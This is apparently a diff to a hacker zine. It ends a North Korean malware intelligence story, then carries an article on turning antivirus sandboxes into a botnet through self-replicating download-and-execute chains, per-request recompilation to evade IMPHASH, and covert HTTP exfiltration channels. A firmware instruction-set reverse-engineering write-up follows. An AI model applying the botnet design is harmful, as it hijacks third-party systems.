+With their campaign discovered, their C2 flooded, and their sample 
+captured, it seems they decided to call it a day and let us be. But 
+remember, the devil is in the details, and they let slip an important one.
+
+--
+
+6) [OPSEC Fail]
+
+May 16. 99 mornings later. Missing those warm days.
+> 15:00
+
+I was reviewing my notes again while working on slides about this story,
+and came across a funny OPSEC fail. During the analysis, I found a file 
+shipped alongside the sample called inputFiles.lst, which contained 
+Maven build information. Reading it, we found some interesting debug 
+messages:
+
+"[...]/default-compile/inputFiles.lst:275 C:\Users\Edward\Downloads\qr-code[...]"
+
+So, our friend was named (or at least went by) Edward and was a happy 
+Microsoft Windows user... what a western spy move, if you ask me. Anyway,
+this story was over, and the best CTI session of my life came to an end. 
+Or did it?
+
+-- 
+
+7) [Outro: February again]
+
+February, 8th. 366 mornings later. Thinking about the upcoming weekend.
+> 22:00
+
+An unknown malware was detected on an engineer's laptop, bundled inside 
+a fake Slack to CSV exporter.
+
+-- 
+
+8) [Acknowledgments]
+
+Bitso Information Security & Quetzal Teams.
+Rob Harrop.
+Juan Brodersen.
+
+-- 
+
+9) [References]
+
+This story was published in various formats: intelligence pulses, talks, 
+articles, and newspapers. You can find links to all of them below.
+
+- DEF CON 31 Video
+    https://www.youtube.com/watch?v=DB6yDJeb6U8
+- DEF CON 31 Slides
+    https://docs.google.com/presentation/d/1mQuauuJCdDI9d_HfIvLdtk_vM4FU4v0AUmlTShV9_hI
+- QRLog Technical Analysis
+    https://github.com/birminghamcyberarms/QRLog
+- QRLog Intelligence Pulse
+    https://otx.alienvault.com/pulse/64cfcc366fc8f13ce315f39a 
+- Labyrinth Chollima Infrastructure Pulse
+    https://otx.alienvault.com/pulse/64cfcc366fc8f13ce315f39a
+- Diario Clarín (Spanish)
+    https://www.clarin.com/tecnologia/hecho-corea-norte-descubren-nuevo-virus-funciona-molotov-digital_0_fR36LRX5mj.html
+- The Hacker News 
+    https://thehackernews.com/2023/08/north-korean-hackers-deploy-new.html
+- SentinelOne
+    https://www.sentinelone.com/blog/jokerspy-unknown-adversary-targeting-organizations-with-multi-stage-macos-malware/
+- SC Magazine
+    https://www.scmagazine.com/news/vmconnect-campaign-linked-to-north-korean-lazarus-group  
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 5 - Master of Puppets - turning AV sandboxes into a botnet ]=------=|
+|=-----------------------------------------------------------------------=|
+
+by Grzegorz Tworek
+
+As malware becomes more and more sophisticated, defenders realize that
+typical static analysis is slowly losing its value as the main method of
+knowing what happens in the infected system. At the same time virtual
+machines are cheaper, more reliable, easier to orchestrate and automate and
+just more friendly. Instead of hiring highly qualified reverse engineers,
+malware analysts can run thousands of machines and observe how they behave
+after being intentionally infected. Once again blunt force tries to replace
+our skills, but in some cases, it seems to make sense.
+
+I have tried to play with such dumb devices multiple times in the past,
+including circular references in vbaProject.bin filesystems, fork bombs etc.
+It was not very sophisticated but sometimes even the timeout may give you
+some satisfaction, not to mention a bit of knowledge about how the stuff
+works inside. Of course, I have tried with EXE files, especially as I have
+realized that a huge number of sandboxes are easily reaching the Internet.
+No need to smuggle bits in NTP or DNS queries, when you simply make a HTTP
+request and observe it on your web server milliseconds later.  Of course, my
+real goal is not to make an analysis itself, but to keep my code running
+forever. This may be achieved with a trick if your analyzed EXE downloads
+and runs another EXE. Which gets launched (a.k.a. detonated), downloads yet
+another EXE, again running and downloading, but I suppose you get the point
+already.
+
+The unsurprising problem I have observed is related to obvious sandbox
+optimization: they get bored. If I drop a file which is already known, no
+one wants to waste time on it anymore, which requires a small challenge when
+it comes to automation of the entire process. Theoretically EXE files are
+relatively easy to modify in their binary form, as some sections (e.g.
+.rdata, .data, or .rsrc) may be carefully overwritten without affecting how
+the program works. Additionally, the PE file format allows appending some
+bytes at the end of file without changing the application behavior. Such
+changes can be automated, leading to a solution that serves a different file
+each time someone requests it. Of course, files (and file hashes) will be
+different each time, but it may not be enough to keep sandboxes attention.
+Even if the file itself differs, a sandbox can quickly realize the new EXE
+is doing basically the same thing as the one already known, using a sequence
+of functions imported from system DLLs. You can observe it e.g. with
+dumpbin.exe tool from Microsoft by issuing "dumpbin.exe /imports
+filename.exe" command. Antivirus solutions calculate the "IMPHASH" [1] using
+this data and can spot that different files are not that different at all
+and get bored, dropping any further analysis and code execution.
+
+
+Theoretically, some advanced binary manipulations could be possible to make
+the EXE file substantially different each time, but I have decided to go
+simpler way and compile a new C source code each time someone wants to
+download an EXE file. Even if I could dynamically generate new source file
+each time, I have simplified my approach with a set of #ifdef, making
+different (randomly picked) parts of the source to be included in the build
+process. The compiler allowed me to set appropriate #define before I start
+the compilation, but when it comes to the randomization of code, it can be
+done with pure preprocessor directives as well [2] if anyone prefers it. Of
+course, randomized parts cannot change the application behavior and their
+execution should not matter. After analyzing different functions to be
+randomly imported I found SNMP and Bcrypt DLLs most convenient. Both look
+suspicious enough to dig deeper but when called in a right way they do
+nothing except returning an error I can safely ignore. For example, the
+BCryptSecretAgreement() checks handles first, and I intentionally call it
+with NULLs, knowing I will obtain STATUS_INVALID_HANDLE with no side
+effects. I am sure a skilled analyst can spot a red herring here, but
+sandboxes are fortunately not smart enough.
+
+Of course, I can easily write, test and compile my code with Visual Studio I
+normally use, but it would be a huge overkill for this scenario, even if
+limited only to command line tools. Finally, I have decided to use Tiny C
+Compiler (https://bellard.org/tcc/) which seemed to perfectly fit my needs.
+
+The server part was initially based on a well-known, thirty years old, CGI
+interface to the Microsoft Internet Information Server. CGI is relatively
+simple to integrate and debug, but at the same time each requests requires
+launching new process, which in turns launches a compiler with appropriate
+parameters such as source files and #define mentioned above. It works, but
+its performance is far from satisfying. On top of the real randomization
+provided by #ifdef, the filename requested by the EXE running in the sandbox
+was randomized as well. Serving a file with changing name is possible in
+couple of ways: by rewriting the request at the server side (too complex),
+by using queries in the URL (too suspicious) or by configuring the 404
+handler to return a freshly compiled EXE each time someone asks for a random
+URL.
+
+Effectively, the flow was:
+
+1. A sandbox "detonates" the EXE file
+2. EXE file sends a HTTP request to the web server fitted with CGI
+3. The server compiles and serves the randomized EXE back to the sandbox
+4. The sandbox saves the obtained file to a disk and launches new process 
+   using it.
+
+And 1-4 repeats. Details of the implementation make parent process at the 
+sandbox present until the child process terminates, which will never happen 
+without an external intervention or a failure.
+
+As I have explained above, the following sequence keeps the sandbox busy and
+in extreme cases, more than 1000 parent-child process levels could be
+observed, which is even more frightening knowing the _wsystem() function
+used to launch a child process executes cmd.exe first, then the real process
+specified as a function parameter. All these cmd.exe processes remain active
+until the launched process terminates.
+
+The source code and the infrastructure serving its compiled version acts
+effectively as a server-to-client part of the C2 communication. If I want
+controlled sandboxes to do something, I simply need to add couple of lines
+to my C source, and new commands will be compiled and downloaded soon.
+Experiments shows that it happens literally within seconds after a change in
+the source code.
+
+The client-to-server communication is simpler, as HTTP protocol provides
+multiple ways of sending data to servers. Out of these methods, only 3 were
+used for simplicity and staying under the radar:
+
+1. Hostname - each time resolved to the same IP, but containing 8 
+   characters I could use to get data back
+2. Path - the part between hostname and the filename I use to encode some 
+   of the requested information, including process chain length counter, 
+   free and total RAM amounts, and the flow identifier allowing me to trace 
+   EXEs coming to sandboxes directly or indirectly, etc.
+3. Referer - allowing me to precisely identify chains, but easy to be 
+   manipulated.
+
+I am also using my own User-Agent (providing some useful information as
+well), but it is manipulated too often to use it as reliable channel. Out of
+typical ways of HTTP communication I am not using anything other than GET
+and I am not using queries in the URL as mentioned above. If I have a full
+control over my query, picking less obvious channels seems more tempting.
+
+Allowing my solution to run in the wild quickly made me aware of limited
+performance at the server side. Even if a single request can be served in
+less than 100ms, the number of requests quickly raises to levels I cannot
+afford on my 4 core D-1521 with 32GB of RAM. To make it work better, the
+following optimizations were implemented:
+
+- Switch from CGI to ISAPI and from tcc.exe to libtcc.dll to minimize 
+  number of processes required per request
+- Source code header files optimization, allowing me to compile ~25kLoC 
+  instead of ~120kLoC
+- Dynamic slowdown on the client side, activated by timeouts or other 
+  errors and repeating failed actions but slower
+- Pre-compiled "failback" files to be served statically from my server if 
+  compilation did not end in the defined time, which could happen when 
+  queues grow very large
+- Reverse proxy taking care of simple requests not requiring compiler 
+  infrastructure.
+
+Optimizations gave me a chance to provide 5x more valid responses from the
+same hardware, which seems to be a nice result.  Just to mention one thing
+more: bandwidth is not an issue at all. Each EXE file is 11-13kB depending
+on randomization, which keeps my WAN lazy, going mostly under 10Mbps.
+
+If for any reason I would need more power, the entire solution easily scales
+by adding additional A records to the DNS, effectively providing a round
+robin. Of course, some reverse proxies, WAFs, or load balancers may be used
+as well.
+
+Effectively, I am serving about 4-5M of fresh EXE files each day, having
+"proof of life" from 20k IP addresses constantly executing my code and
+waiting for new commands to be issued. Some sandboxes run for longer time,
+some drops the execution quickly, but new executions, not being a result of
+a process chain are responsible for only about 10% of traffic.
+
+I believe it’s clear how I keep sandboxes busy. The common question though
+is how to feed them for the first time. It depends if you are in hurry or
+not. If not, just link your first EXE somewhere. It will be picked up sooner
+or later and then spread across sandboxes. If you need to see effects
+quickly, some violation of Terms of Service of the popular portal spreading
+files between different AV engines may be required. If you upload your EXE
+there, sandboxes will care about it within a few minutes.
+
+When you need to stop, no worries. Even if some server address is totally
+dead for 6 months and you turn it back on, bots will do their job and you
+will see requests coming very soon.
+
+References:
+
+[1] https://cloud.google.com/blog/topics/threat-intelligence/
+    tracking-malware-import-hashing/
+[2] http://www.ciphersbyritter.com/NEWS4/RANDC.HTM
+
+The source code of ISAPI and Client can be seen at 
+https://github.com/gtworek/PSBits/tree/master/TrollAV
+
+A snapshot of the code is embedded at the end of this linenoise article.
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 6 - Learning an ISA by force of will ]=----------------------------=|
+|=-----------------------------------------------------------------------=|
+
+by iximeow
+
+cpu instruction sets are one of my special interests. Catherine 'whitequark' 
+posted about a weird instruction set. so of course i asked for a copy of the 
+binary. it indulged me! it's called noes, who knows why.
+
+> ls -al noes
+-rw-rw-r-- 1 iximeow iximeow 12935 May 23 18:12 noes
+
+so, 12.6KiB of some firmware for a headset or something, and an otherwise 
+unknown instruction set. this is catnip, to me.
+
+and so here is where i started:
+
+00000000: bc60 bb68 e4e3 e5ed e28f e301 2842 9903  .`.h........(B..
+00000010: 4391 05d4 c4bc 69bb bc26 bee0 04c8 41f0  C.....i..&....A.
+00000020: e044 c840 f0e0 bbc8 51f0 e094 c850 f0ec  .D.@....Q....P..
+00000030: e3ed bfd8 0ebc e005 bfd0 0ec8 e3ed cc19  ................
+00000040: b9e0 04c8 41f0 e064 c840 f0e0 bbc8 51f0  ....A..d.@....Q.
+00000050: e077 c850 f0bc 4704 e001 d2e0 72c8 43f0  .w.P..G.....r.C.
+00000060: e0bc c842 f0e0 bbc8 53f0 e0d3 c852 f0e4  ...B....S....R..
+00000070: 01bf 9075 bce9 72e8 99b7 9003 bce9 72e2  ...u..r.......r.
+00000080: 1ce3 00e0 72c8 43f0 e0e7 c842 f0e0 bbc8  ....r.C....B....
+00000090: 53f0 e0b4 c852 f0bc c072 e013 c820 b5e0  S....R...r... ..
+000000a0: ecc8 1fb5 bc59 40e1 08e8 48b6 7990 0a28  .....Y@...H.y..(
+000000b0: c84c b6c8 4bb6 bc3c 6be8 48b6 9007 c84c  .L..K..<k.H....L
+000000c0: b628 c84b b6bc bd6b bce4 61e0 127a 284b  .(.K...k..a..z(K
+000000d0: 9904 e012 9007 1471 e841 b559 49c8 41b5  .......q.A.YI.A.
+000000e0: e100 c942 b500 00bc a257 bfd0 0ec8 c2b9  ...B.....W......
+000000f0: ccc1 b9ca c3b9 e8f9 b422 9803 bc2d 33bc  ........."...-3.
+00000100: da32 8612 76e8 0bb4 7e99 0476 bc75 bce9  .2..v...~..v.u..
+00000110: 0cb4 1679 9903 ee0c b4e9 0cb4 1659 4976  ...y.........YIv
+
+i also often think about the lovely writeup[1] from Robert Xiao on a similar 
+problem presented as a Dragon CTF teaser challenge a few years ago. working 
+from an unknown data encoding all the way out to an instruction set and high 
+level behavior is certainly possible, but it's not an opportunity that comes 
+up often. it sounds fun! so i decided to chew on noes with as little context 
+as i could have - the opportunity doesn't come up too often!
+
+making heads or tails of the binary turned out to be quite a few words, 
+which i've roughly broken up as:
+
+- which way is up?
+- one instruction, to many instructions
+- a virtuous cycle
+- control flow!!
+- loads and stores!!
+- it does, in fact, have an ALU
+- inc and dec are a loop's best friend
+- more subtle loads or stores?
+- a multiplier!
+- what's left?
+- whittling down the last few opcodes...
+  - 48..4f
+  - 59 ... or a wild guess towards 58..5f?
+  - 60..67 ... where possible
+  - ba
+  - 00..07
+- mostly done, what's left in the encoding space?
+- 78..7f ... sub or cmp?
+- what is a0?
+- what are c0..c7?
+- but wait! what happened with jcc?
+- last thoughts
+- conclusion
+  - summarized materials
+
+--[ which way is up?
+
+even just at the bottom of this first window it's clear there's some kind of 
+structure to this thing. but if it's code or data, who knows. i did luck out 
+that the terminal size i happened to open noes with showed some structure, 
+otherwise i'd have resorted to the same age-old trick of "resize the window 
+until it looks right".
+
+so there's some structure, the file is kind of tiny, the file is notionally 
+a firmware for a processor, so presumably the processor also is kind of 
+tiny. the bytes here are not obviously an 8080/6502/etc. probably not a 
+tiny ARM core, because the repetition at the end of the above is offset 
+by 1: this processor must be OK with instructions at odd addresses.
+
+scrolling through the file for anything else interesting and this stands out:
+
+00001358: bc60 bb68 e4e3 e5ed e28f e301 2842 9903  .`.h........(B..
+00001368: 4391 05d4 c4bc 69bb bc26 bee0 04c8 41f0  C.....i..&....A.
+00001378: e044 c840 f0e0 bbc8 51f0 e094 c850 f0ec  .D.@....Q....P..
+00001388: e3ed bfd8 0ebc e005 bfd0 0ec8 e3ed cc19  ................
+00001398: b9e0 04c8 41f0 e064 c840 f0e0 bbc8 51f0  ....A..d.@....Q.
+000013a8: e077 c850 f0bc 4704 e001 d2e0 72c8 43f0  .w.P..G.....r.C.
+000013b8: e0bc c842 f0e0 bbc8 53f0 e0d3 c852 f0e4  ...B....S....R..
+000013c8: 01bf 9075 bce9 72e8 99b7 9003 bce9 72e2  ...u..r.......r.
+000013d8: 1ce3 00e0 72c8 43f0 e0e7 c842 f0e0 bbc8  ....r.C....B....
+000013e8: 53f0 e0b4 c852 f0bc c072 e013 c820 b5e0  S....R...r... ..
+000013f8: ecc8 1fb5 bc59 40e1 08e8 48b6 7990 0a28  .....Y@...H.y..(
+
+this is different, which makes it interesting! this is a long span of bytes 
+with very few ascii bytes, unlike the rest of the file which has a more 
+frequent mix of bytes in [0, 255]. the content starts with an increasing 
+series, 80 81 82 83 84 85 E8 E6 B0 80 E8 E7 B0 80 ..., and towards the end 
+has 8D 8C 8B 8A 89 88. this might be data? maybe a lookup table?
+
+there are other regions of clear structure, like:
+00002478: 6af1 ed6b f112 e96c f121 7213 e96d f121  j..k...l.!r..m.!
+00002488: 7314 e96e f121 7415 e96f f121 7512 e925  s..n.!t..o.!u..%
+00002498: ee21 7213 e926 ee21 7314 e927 ee21 7415  .!r..&.!s..'.!t.
+000024a8: e928 ee21 75ca 68f1 cb69 f1cc 6af1 cd6b  .(.!u.h..i..j..k
+000024b8: f112 1b1c 1d98 07e4 a4e5 debc 98df b9e4  ................
+000024c8: 6de5 dfbc 98df bf10 6fe0 08c8 10f3 bf2f  m.......o....../
+
+but what does 21 72 13 E9 mean? or 21 73 14 E9? 21 74 15 E9? maybe four-byte 
+instructions with different operands?
+
+ok. time to break out the big tools.
+
+    # iximeow> xxd -ps noes | head -n 20
+    bc60bb68e4e3e5ede28fe30128429903439105d4c4bc69bbbc26bee004c8
+    41f0e044c840f0e0bbc851f0e094c850f0ece3edbfd80ebce005bfd00ec8
+    e3edcc19b9e004c841f0e064c840f0e0bbc851f0e077c850f0bc4704e001
+    d2e072c843f0e0bcc842f0e0bbc853f0e0d3c852f0e401bf9075bce972e8
+    99b79003bce972e21ce300e072c843f0e0e7c842f0e0bbc853f0e0b4c852
+    f0bcc072e013c820b5e0ecc81fb5bc5940e108e848b679900a28c84cb6c8
+    4bb6bc3c6be848b69007c84cb628c84bb6bcbd6bbce461e0127a284b9904
+    e01290071471e841b55949c841b5e100c942b50000bca257bfd00ec8c2b9
+    ccc1b9cac3b9e8f9b4229803bc2d33bcda32861276e80bb47e990476bc75
+    bce90cb416799903ee0cb4e90cb416594976ea0cb4e300e80bb4e100594a
+    72114b7383821672e300fc0881e1ff518980e0ff097188bfecac8a8bbf9d
+    acc9ddeec8dcee8eb9e701bc2d2e86e1ffe8edb4799044bf523276901de0
+    54c857f3e019c856f328c853f300c852f371e850f319c850f3bc01bd1674
+    bfb628719819e1fee850f321c850f328c8edb4e008c853f328c852f3bf87
+    308eb9e200e004c841f0e044c840f0e0bbc851f0e094c850f0e101121972
+    e072c843f0e0bcc842f0e0bbc853f0e0d3c852f0e102121972e040c845f0
+    e050c844f0e0bbc855f0e0f6c854f0e104121972e06ac847f0e05ec846f0
+    e0bcc857f0e003c856f0e108121972e061c849f0e0e1c848f0e0bcc859f0
+    e024c858f0e110121972e057c84bf0e089c84af0e0bcc85bf0e027c85af0
+    e120121972e032c84df0e0c8c84cf0e0bcc85df0e046c85cf0e140121972
+
+more structure to this, highlighting helps..
+
+    308eb9e200e004c841f0e044c840f0e0bbc851f0e094c850f0e101121972
+                  ^^        ^^        ^^        ^^              
+    e072c843f0e0bcc842f0e0bbc853f0e0d3c852f0e102121972e040c845f0
+        ^^        ^^        ^^        ^^                  ^^    
+    e050c844f0e0bbc855f0e0f6c854f0e104121972e06ac847f0e05ec846f0
+        ^^        ^^        ^^                  ^^        ^^    
+    e0bcc857f0e003c856f0e108121972e061c849f0e0e1c848f0e0bcc859f0
+        ^^        ^^                  ^^        ^^        ^^    
+    e024c858f0e110121972e057c84bf0e089c84af0e0bcc85bf0e027c85af0
+        ^^                  ^^        ^^        ^^        ^^    
+    e120121972e032c84df0e0c8c84cf0e0bcc85df0e046c85cf0e140121972
+                  ^^      ^^^^        ^^        ^^              
+
+if c8 marks the start of some instruction or sequence, then those 
+sequences are something like:
+
+    c841f0e044 c840f0e0bb c851f0e094 c850f0e101 ...
+    ... c843f0e0bc c842f0e0bb c853f0e0d3 c852f0e1 ...
+
+and so seeing 41f0, 40f0, 51f0, 50f0, 43f0, 42f0, 53f0, 52f0, and others 
+like it, immediately suggests something little-endian is happening. those 
+might be offsets for a memory access? e044, e0bb, etc could be other 
+immediates or operand selectors. maybe c8 is an opcode itself?
+
+this is a great start: there's some kind of structure, something that looks 
+like a workable guess for how at least one instruction is structured, values 
+that look like addresses - or at least relative offsets. even if this is 
+more data than code, there's enough structure here to chew on and learn 
+more about the firmware.
+
+--[ one instruction, to many instructions
+
+if i were stumped at this point i'd have started looking for common byte 
+sequences, working through a list to guess what might be function prologues 
+or epilogues, and go from there. but, being neither stumped nor interested 
+in switching away from the next most advanced tool i have on hand - 
+`xxd -ps noes | vim -` - i stuck with eyeballing common bytes. 
+8e stuck out:
+
+    75bffce2fe0671fe0272fe0373f219d28e8fb98786ca56ef147615771674
+                                    ^^                          
+    1775bffce2ea56eff674bfe4448e8fb9878628c857eec856eee412bf14e9
+                              ^^                                
+    761177e010de03e20016741775bf5f058e8fb9e8e9ed9803bccfe2e85aee
+                                    ^^     ^^                   
+    e95bee19982de855eec84befc94defe85aeec84cefe268e3eee461e5eebf
+                                                 ^^             
+    dfe3ea5aeeeb5beefa079026c85beec85aeebcc0e3e854eec84befe859ee
+    c84defe858eec84cefe268e3eee461e5eebfdfe3e001c84befe85deec84d
+             ^^          ^^                                     
+
+and in fact the longer common sequences are 8e8fb98786:
+    75bffce2fe0671fe0272fe0373f219d28e8fb98786ca56ef147615771674
+                                    ^^^^^^^^^^
+    1775bffce2ea56eff674bfe4448e8fb9878628c857eec856eee412bf14e9
+                              ^^^^^^^^^^
+    761177e010de03e20016741775bf5f058e8fb9e8e9ed9803bccfe2e85aee
+    e95bee19982de855eec84befc94defe85aeec84cefe268e3eee461e5eebf
+    dfe3ea5aeeeb5beefa079026c85beec85aeebcc0e3e854eec84befe859ee
+    c84defe858eec84cefe268e3eee461e5eebfdfe3e001c84befe85deec84d
+
+this shows up across the file, but 8786 is only sometimes present. so maybe 
+this is the epilogue of one function, and the prologue of the next? in which 
+case the epilogue would be 8e8fb9 and the prologue is 8786. then b9 is ret? 
+8e8f and 8786 are pop and push respectively? lets see if that gives us 
+reasonably-sized functions. as some examples:
+
+  ... 8e8fb9
+      ^^^^^^
+  8786cae5eecce6eee412bf14e9761177e8e6eede03e8e5eede04e20016741775bf5f058e8fb9
+                                                                        ^^^^^^
+  e200e45390d4b9e4f5e5edbf82c3e0d4c85cefe0e8c85bef28c85eefe003
+  [ 210 bytes ]
+  bf2bd78e8fb9
+        ^^^^^^    
+  e500e406e260e3ed14e1005272110b73f27215527504e118
+  [ 240 bytes ]
+  19e0f2c8ecee177116c0c9eeeec8edeee1fff65172e412bf4bd48e8fb9
+    
+  cc86f2cd87f2e004c882f2b928c855f3e01ac854f3e1fee850f321c850f3e0
+  [ 420 bytes ]
+  75bf8cdaea0aef02ca0aefe199127991818e8fb9
+                                    ^^^^^^
+
+nothing huge, seems like a workable assumption.
+
+--[ a virtuous cycle
+
+with a guess of function prologues and epilogues, i can guess at the 
+instructions around the entry/exit of these "theorized functions".
+
+some more looking around, c8 is pretty common and seems to be followed by 
+two bytes that might be an address?
+
+
+    52e8ec76edbfdee6e876ed9805e401bc52e8b928c806eec805eec847eee8
+                                            ^^    ^^    ^^      
+    03f3619016e003c84beee001c84aeee140e8a3f919c8a3f9bc3b60e102e8
+                  ^^                                            
+    4aee799026e003c84beee8eded9805e008c803f3e008c88cf971e898f919
+                  ^^                  ^^        ^^              
+    c898f9e1bfe8a3f921c8a3f9b9e010c803f3bf9f5ce108e898f919c898f9
+    ^^                ^^          ^^                      ^^    
+    e1bfe8a3f921c8a3f9e001c846eeb98786e101e847ee79902c28c847eee4
+                ^^        ^^                            ^^      
+    05e5eebf82c3e0c8c852b9e071c851b9e001c854b9e0f4c853b9e201e400
+                  ^^^^        ^^        ^^        ^^            
+    bf9513c906eec805eee102e8e6ed799003bf2dc2e2cce342e85bede95ced
+                ^^                                              
+
+there are definitely other c8s here that don't make sense yet, but 
+06ee .. 05ee and 4bee .. 4aee look like sequential addresses, and 03f3 shows 
+up a few times which suggests these addresses are probably absolute.
+
+in-between there are several e0 followed by a relatively low byte, e001 
+between two c8 sequences, e008, e010, an e071 once. the second byte might 
+be an immediate, maybe an offset? the values tend towards bitmasks, for 
+whatever reason. this also happens with e1 and an e2 in the same region:
+
+    52e8ec76edbfdee6e876ed9805e401bc52e8b928c806eec805eec847eee8
+    03f3619016e003c84beee001c84aeee140e8a3f919c8a3f9bc3b60e102e8
+    4aee799026e003c84beee8eded9805e008c803f3e008c88cf971e898f919
+    c898f9e1bfe8a3f921c8a3f9b9e010c803f3bf9f5ce108e898f919c898f9
+    e1bfe8a3f921c8a3f9e001c846eeb98786e101e847ee79902c28c847eee4
+    05e5eebf82c3e0c8c852b9e071c851b9e001c854b9e0f4c853b9e201e400
+                                                        ^^^^
+    bf9513c906eec805eee102e8e6ed799003bf2dc2e2cce342e85bede95ced
+                                            ^^^^
+
+so maybe eX is a whole range of instructions with one-byte immediates?
+
+with this, lets see how a hypothesized function breaks apart..
+
+    87 86
+    14761577f698 19e0f2
+    c8ecee 177116c0 c9eeee c8edee e1ff f65172 e412 bf4bd4
+    8e 8f b9
+
+7X is another one-byte instruction maybe? 1X too? calling 86 "push A" and 
+87 "push B", similarly with 8e 8f, that gives us:
+
+    87 86                       ; push B; push A
+    14 76 15 77 f698 19e0f2
+    c8ecee 17 71 16 c0 c9eeee c8edee e1ff f651 72 e412 bf4bd4
+    8e 8f b9                    ; pop A; pop B; ret
+
+checking that other blocks seem to break apart reasonably as "functions", 
+this is how vim starts to look. knowing c8XXXX is an instruction, in turn, 
+makes other instructions more clear:
+
+   87 86
+   28 c809ef                           ; 28 looks like something
+   72 e461 e5ee bf29e3                 ; 72 looks like something, bf?
+   e200 e468 e5ee bf29e3 bf2ae0 bffedc ; bf?
+   28 76 77 e84cee e94dee e201a
+   6939384290fac923f5c822f5e101e826f519c826f5c981f1e850f1649806 ; dunno 
+   28c878ed9818e803f3619807e001c809ef900bc6e1081679e107174991bc ;  about 
+   bf4fdde826f56090fabf33e1e0072f9008e0082e9003bf2dc2e809ef9803 ;   these
+   bf2bd7
+   8e 8f b9 ; but an epilogue
+
+lots that would be too early to guess about, but 28 seems like a functional 
+instruction, as does 72. bf might be a relative load or store?
+
+if this is a vaguely normal 8-bit CPU, there ought to be conditional relative
+branches around somewhere too, which can help point towards instruction 
+boundaries. most relative branches are short, either in the positive or 
+negative direction (for loops), so that's worth keeping in mind. keeping 
+an eye out is the best option, not really sure how to proactively find them. 
+at the very least, it's probably not e0..e7 as the conditional branches, 
+because the following byte is sometimes ff (branch $-1??) or 00 (branch $???)
+
+looking at more code with the new guess that b9 is the end of a function, 
+this region is informative:
+
+    ... snip ...
+    b9
+    
+    ; new function?
+    e500 e406 e260 e3ed 14 e100 52 72   ; 14, 52, also 72 instructions?
+    110b 73f2 7215 52 7504 e118         ; not sure if this makes sense
+    14 79 91e8 15
+    b9                                  ; ret
+    
+    ; new function?
+    28 c83bb5 e0fc c83cb5 28 c83db5 c83eb5 c842b5 e017 c841b5
+    e0ed c840b5 e061 c83fb5 bfded5 c865ed bf314d 71 9003 e006 b9
+    
+    28 b9                               ; something, ret
+    
+    ; new prologue
+    86 ...more...
+
+28 b9 seems too short to be a function (why call to 28? if you want 28 just 
+inline it), so that's noteworthy. but 9003 is 3 bytes before it. 9003 as a 
+jz $+3? and 28 b9 is an alternate ret? that skips over e006; ret? seems 
+workable.
+
+so 90XX as conditional branch... here's a function where early on i guessed 
+instructions' start and end offsets based on vibes, and gotten a few details 
+quite wrong:
+
+    87 86
+    cc27efcd28ef28 c8f1b0 e002 c863ef e05a c862ef
+    cd65ef 14 cc64ef e201 e400 bf83e9 76 11 77 71 16 19 
+    90 03 bf420b e8f1b0       ; 9003 is one instruction, not two
+    98fb
+    8e 8f b9
+
+fixing that up with what i know now it looks more like...
+
+    87 86
+    cc27efcd28ef28 c8f1b0 e002 c863ef e05a c862ef
+    cd65ef 14 cc64ef
+    e201 e400 bf83e9 76 11 77 71 16 19
+    9003 bf420b                                     ; jCC $+3
+    e8f1b0
+    98fb                                            ; is this jCC $-5?
+    8e 8f b9
+
+so maybe 9X is a whole family of conditional branches? plausible...
+
+    e008 c803f3 bf52d8 28 c8e6ed c8eeed
+    8eb9e8eded
+    9001   ; hadn't noticed this 9001 at first. conditional branch over a ret?
+    b9 28 c8eeed c8eded
+    e4f1 e5ed bf82c3 bffedc bf106f
+
+adjusting that a bit:
+
+    e008 c803f3 bf52d8 28 c8e6ed c8eeed
+    8eb9e8eded
+    9001 b9
+    28 c8eeed c8eded
+    e4f1 e5ed bf82c3 bffedc bf106f
+
+finding other interesting patterns around 9Xs, this function:
+
+    87 86 15 71 14 e304 53 9101 0176      ; 91XX as jCC?
+    1177 e101 fe01 79 e104 f679 9034 e102 fe01
+    79 9006 bf3cd5bccdc7e101fe01          ; 79 is a test or cmp or sub maybe?
+    79 9803 bccdc7e1f7e854f121c854f1e400bffa48e1fde856f121c856f1bf
+    17d5bccdc7e110f6799034e850f164986c e101 fe01
+    79 900f e401 bf67c5
+    e200 e41f bf2b31 bccdc7 e102 fe01 79 904f
+    e200 e423 bf2b31 e850f1 62 983d e400 983b e102 f679 90 38 
+    e850f1 64 9832 fe01 79 9018 e108 e854f1 19 c854f1
+    e401 bf67c5 e852f1 60 9819 e400 9812 e101 fe01 
+    79 900e e1f7 e854f1 21 c854f1
+    e401 bf67c5
+    8e8fb9
+
+following offsets for the proposed jCC in the third and fourth lines yields:
+
+    79 9006 bf3cd5bccdc7 e101 fe01            ; so fe01 is something (`feXX`?)
+    79 9803 bccdc7 e1f7 e854f1 21 c854f1 e400 ; bcXXXX (or more?) is something
+    bffa48e1fde856f121c856f1bf
+
+incidentally in the literal next function that knowledge of bf breaks things 
+up into another pattern,
+
+    86
+    e406 bf551b 76 980b e406 bf551b 76 9803 bf420b e406
+    bf8f4d 71 9003 bf420b e0ee c840b5 e0f3 c83fb5 28 c842b5 e016 c841b5
+    bf114d 71 9003 bf420b e812b1 e913b1 ea14b1 eb15b1
+    ecfcee 7c 9012 e8fdee 79900c
+    e8feee 7a 9006
+    e8ffee 7b 9803 bf420b e80db1 e90eb1 ea0fb1 eb10b1
+    ec05ef 7c 9012
+    e806ef 79 900c
+    e807ef 7a 9006
+    e808ef 7b 9803
+    bf420b 8eb9e400bf
+
+this is great; 7x definitely seems like it generates some kind of branch 
+condition, and 9xXX seems like a conditional branch based on that result.
+
+--[ control flow!!
+
+from this point onward, i'll be marking up approximate level of nesting with 
+indentation. for each branch over a byte of code, it will be indented an 
+additional level. when the branch target is reached, unindent. for simple 
+control flow this gives a general idea of how PC moves through a region.
+
+revisiting the above with this additional structure is immediately informative!
+
+    86
+    e406 bf551b   ; this and 76 after are the same as the one two lines down
+    76 980b
+      e406        ; doing something to r4? getting a condition out?
+      bf551b      ; does bf551b reference memory?
+      76 9803
+        bf420b
+    e406 bf8f4d
+    71 9003
+      bf420b
+    e0ee c840b5
+    e0f3 c83fb5 28 c842b5
+    e016 c841b5
+    bf114d 71 9003
+      bf420b
+    e812b1 e913b1 ea14b1 eb15b1 ecfcee
+    7c 9012
+      e8fdee
+      79 900c
+        e8feee
+        7a 9006
+          e8ffee
+          7b 9803
+            bf420b
+    e80db1 e90eb1 ea0fb1 eb10b1 ec05ef
+    7c 9012
+      e806ef
+      79 900c
+        e807ef
+        7a 9006
+          e808ef
+          7b 9803
+            bf420b
+    ; note 8e b9 here, some kind of early ret?
+    ; missed that at first!
+    8eb9 e400bf
